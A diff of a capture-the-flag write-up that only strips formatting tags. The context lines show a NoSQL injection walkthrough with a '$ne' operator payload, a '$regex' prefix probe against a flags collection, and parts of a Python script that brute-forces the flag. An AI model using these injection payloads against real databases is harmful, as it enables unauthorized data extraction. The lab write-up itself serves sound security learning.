@@ -32,13 +32,11 @@ It even gives us an example! We can check the [Portswigger labs](https://portswi
 
 When sending:
 
-{% code overflow="wrap" %}
 
 ```json
 query={"$ne":null}&collection=movies
 ```
 
-{% endcode %}
 
 The server responds `unknown top level operator: $ne`
 
@@ -54,13 +52,11 @@ When I try to enter `[$regex]=.{25}` as search query for the `flags` collection,
 
 Using that format, we apply a regular expression to see if the flag begins with `flag`.
 
-{% code overflow="wrap" %}
 
 ```
 flag: {$regex: ^flag}
 ```
 
-{% endcode %}
 
 ![](images/3.PNG)
 
@@ -68,7 +64,6 @@ It does! So we can just write a python script to loop through all possible hex c
 
 I just finished a 72 hour OSWE exam which required automating exploit chains into a 1-click-pwn script _without_ help from an LLM. Since that is finished, I'll make life easier for myself 😁
 
-{% code overflow="wrap" %}
 
 ```python
 import requests
@@ -114,7 +109,6 @@ while not flag.endswith("}"):
 print(f"[🏁] Final flag: {flag}")
 ```
 
-{% endcode %}
 
 It works, we get the flag 😎
 
